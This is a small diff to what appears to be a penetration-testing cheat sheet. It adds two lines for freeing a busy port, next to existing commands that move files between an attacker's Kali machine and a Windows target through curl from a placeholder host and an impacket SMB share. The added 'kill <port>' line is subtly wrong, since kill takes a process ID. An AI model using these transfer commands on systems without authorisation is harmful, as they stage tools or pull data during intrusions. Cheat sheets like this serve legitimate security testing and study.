@@ -507,6 +507,10 @@ curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```powershell
 kali> impacket-smbserver -smb2support <sharename> .
 win> copy file \\KaliIP\sharename
+
+# If port is taken...
+sudo netstat -tpln
+sudo kill <port>
 ```
 
 ## Adding Users
